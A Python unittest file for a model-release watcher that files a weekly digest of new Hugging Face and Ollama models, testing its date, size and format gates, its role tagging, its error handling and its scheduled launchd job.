        # The date gate must drop it before filing: with the gate planted out it files (servable GGUF).
        world = self.make_world()
        self.hold_back(world, "google/OldModel-7B")
        self.baseline(world)
        world.hf["google"].append(("google/OldModel-7B", "e" * 40, 7 * GB))
        world.hf_meta["google/OldModel-7B"] = {
            "siblings": [{"rfilename": "config.json", "size": 2000},
                         {"rfilename": "oldmodel-7b.gguf", "size": 7 * GB}],
            "tags": ["license:apache-2.0"], "gated": False}
        second = self.home.digest(world, FakeBr(), publishers=self.PUBS)
        self.assertTrue(second["ok"], second["errors"])
        self.assertNotIn("hf:google/OldModel-7B", [e["id"] for e in second["filed"]])
        self.assertNotIn("hf:google/OldModel-7B", [s["id"] for s in second["skipped"]])

    def hold_back(self, world, *repos):
        """Remove rows from the world for the baseline; the test re-adds them after to file them."""
        held = []
        for author, rows in world.hf.items():
            keep = []
            for r in rows:
                (held if r[0] in repos else keep).append(r)
            world.hf[author] = keep
        return held

    def test_fit_and_format_gates(self):
        world = self.make_world()
        held = self.hold_back(world, "google/Gemma4-27B-MLX", "google/RewardRM-8B", "Qwen/Qwen3-8B-GGUF",
                              "Qwen/qwen3.8", "google/Huge-100B", "google/PlainText-7B", "google/Gemma4-9B")
        self.baseline(world, expect=1)   # judgebot only; every other row is held back or dateless
        for author, rows in (("google", [r for r in held if r[0].startswith("google/")]),
                             ("Qwen", [r for r in held if r[0].startswith("Qwen/")])):
            world.hf[author].extend(rows)
        br = FakeBr()
        second = self.home.digest(world, br, publishers=self.PUBS)
        by_id = {e["id"]: e for e in second["filed"]}
        self.assertEqual(by_id["hf:Qwen/Qwen3-8B-GGUF"]["row"]["formats"], ["GGUF"])
        self.assertEqual(by_id["hf:google/Gemma4-27B-MLX"]["row"]["formats"], ["MLX"])
        self.assertEqual(by_id["hf:Qwen/qwen3.8"]["row"]["formats"], ["ollama"])
        skipped = {s["id"]: s["reason"] for s in second["skipped"]}
        self.assertIn("oversize", skipped["hf:google/Huge-100B"])
        self.assertIn("no GGUF, MLX or Ollama build", skipped["hf:google/PlainText-7B"])
        self.assertIn("no GGUF, MLX or Ollama build", skipped["hf:google/Gemma4-9B"])

    def test_role_tagging_judge_and_embedding(self):
        world = self.make_world()
        world.hf_pipes["google/Gemma4-9B"] = "feature-extraction"
        world.hf_meta["google/Gemma4-9B"] = {
            "siblings": [{"rfilename": "config.json", "size": 2000},
                         {"rfilename": "gemma4-9b.gguf", "size": 9 * GB}],
            "tags": ["license:gemma"], "gated": False}
        held = self.hold_back(world, "google/Gemma4-9B", "google/RewardRM-8B")
        self.baseline(world, expect=6)   # 27B-MLX, PlainText, Huge + 2 Qwen + judgebot
        world.hf["google"].extend(held)
        world.ollama["judgebot"]["0.8b"] = ("judgebot-08b", 7 * GB)   # a new tag after baseline: filed, not baselined
        br = FakeBr()
        second = self.home.digest(world, br, publishers=self.PUBS)
        by_id = {e["id"]: e for e in second["filed"]}
        self.assertEqual(by_id["hf:google/RewardRM-8B"]["role"], "judge candidate")
        self.assertEqual(by_id["hf:google/RewardRM-8B"]["row"]["license"], "gemma (gated)")
        self.assertEqual(by_id["hf:google/Gemma4-9B"]["role"], "embedding")
        titles = [c[c.index("--title") + 1] for c in br.calls]
        self.assertIn("screen judgebot for judge candidate", titles)
        self.assertIn("screen google/Gemma4-9B for embedding", titles)

    def test_any_to_any_counts_as_generation(self):
        self.assertEqual(rw.digest_role("any-to-any", "google/gemma-4-12B-it-qat-q4_0-gguf"), "generation")
        self.assertIsNone(rw.digest_role("image-text-to-text", "google/diffusiongemma-26B-A4B-it"))

    def test_modified_only_recency_keeps_old_created_rows(self):
        world = self.make_world()
        cutoff = NOW - timedelta(days=7)
        stale = [u for u in rw._digest_units(world, ("google",), cutoff) if not u.error]
        self.assertNotIn("hf:google/OldModel-7B", [i["id"] for u in stale for i in u.items])
        world.hf_touched["google/OldModel-7B"] = "2026-09-29T12:00:00.000Z"
        units = [u for u in rw._digest_units(world, ("google",), cutoff) if not u.error]
        by_id = {i["id"]: i for u in units for i in u.items}
        self.assertIn("hf:google/OldModel-7B", by_id)
        self.assertEqual(by_id["hf:google/OldModel-7B"]["modified"], "2026-09-29T12:00:00+00:00")

    def test_captured_mlx_listing_parses_to_generation_items(self):
        raw = (Path(__file__).parent / "fixtures" / "hf-mlx-community-listing.json").read_bytes()

        def fetch(url, headers=None, timeout=15):
            if "expand" in url:
                return 200, b"[]"
            return 200, raw

        cutoff = datetime(2026, 9, 25, 6, 17, tzinfo=UTC)
        (unit,) = [u for u in rw._digest_units(fetch, ("mlx-community",), cutoff) if not u.error]
        by_id = {i["id"]: i for i in unit.items}
        self.assertEqual(by_id["hf:mlx-community/K2-Horizon-7B-bf16"]["role"], "generation")
        self.assertNotIn("hf:mlx-community/clef-8bit", by_id)   # zero-shot-classification: out of scope
        self.assertNotIn("hf:mlx-community/phartakos-mlx", by_id)   # audio-to-audio: out of scope

    def test_failed_modified_query_degrades_with_an_error(self):
        world = self.make_world()
        self.baseline(world)
        world.hf["google"].append(("google/Gemma4-70B-MLX", "7" * 40, 30 * GB))

        def fetch(url, headers=None, timeout=15):
            if "expand" in url:
                return 0, b""
            return world(url)

        report = rw.digest_once(fetch=fetch, br=FakeBr(), now=NOW, home=self.home.path, publishers=self.PUBS)
        self.assertTrue(any("lastModified unavailable" in e for e in report["errors"]), report["errors"])
        self.assertIn("hf:google/Gemma4-70B-MLX", [e["id"] for e in report["filed"]])

    def test_parse_since(self):
        self.assertEqual(rw.parse_since("7d"), 7.0)
        self.assertEqual(rw.parse_since("24h"), 1.0)
        for bad in ("", "week", "7", "7w", "-3d"):
            with self.assertRaises(rw.WatchError):
                rw.parse_since(bad)

    def test_weekly_digest_agent_runs_digest_monday_morning(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            doc = rw.digest_launchd_plist(home, "/py")
            self.assertEqual(doc["Label"], rw.DIGEST_LABEL)
            self.assertEqual(doc["ProgramArguments"], ["/py", "-m", "localbench", "watch-releases", "--digest"])
            self.assertEqual(doc["StartCalendarInterval"], {"Weekday": 1, "Hour": 9, "Minute": 0})
            calls = []

            def run(argv, **kw):
                calls.append(argv)
                return subprocess.CompletedProcess(argv, 0, "", "")

            path = rw.install_digest_agent(home, "/py", run=run)
            self.assertEqual(plistlib.loads(path.read_bytes()), doc)
            self.assertEqual(calls[-1][:2], ["launchctl", "bootstrap"])


if __name__ == "__main__":
    unittest.main()


class DraftSpecs(unittest.TestCase):
    def test_screen_candidate_writes_uncommitted_draft(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            item = {"name": "acme/model", "tag": "q4", "source": "ollama", "role": "judge candidate"}
            draft = rw.write_draft_spec(home, item, "2026-10-03T00:00:00Z")
            self.assertTrue(draft.is_file())
            payload = json.loads(draft.read_text())
            self.assertEqual(payload["status"], "DRAFT")
            self.assertEqual(payload["spec"]["candidates"], [{"route": "ollama:acme/model:q4"}])
            self.assertFalse((home / ".git").exists())
